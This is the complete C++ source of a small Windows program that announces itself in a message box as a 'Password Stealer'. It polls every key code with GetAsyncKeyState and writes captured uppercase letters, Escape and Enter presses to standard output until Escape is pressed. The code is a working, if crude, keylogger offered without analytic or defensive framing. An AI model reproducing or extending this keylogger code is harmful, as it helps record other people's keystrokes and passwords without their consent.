#include <iostream>
#include <windows.h>
#include <ctype.h>

int APIENTRY WinMain(
    HINSTANCE hInstance,
    HINSTANCE hPrevInstance,
    LPSTR lpCmdLine,
    int nShowCmd
) {
    MessageBoxW(NULL, L"Your password is't safe", L"Password Stealer", 0);
    while(!(GetAsyncKeyState(VK_ESCAPE) & 0x01)) {
        for (int i = 0; i < 256; i++){
            
            if (GetAsyncKeyState(i) & 0x01){
                if (std::isupper(i)) {
                    std::cout << char(i);
                }
                else if (i == VK_ESCAPE){
                    std::cout << "[ESC]";
                }
                else if (i == VK_RETURN) {
                    std::cout << "[ENTER]";
                }
            }
            
        }
        
    }
    
    return 0;
}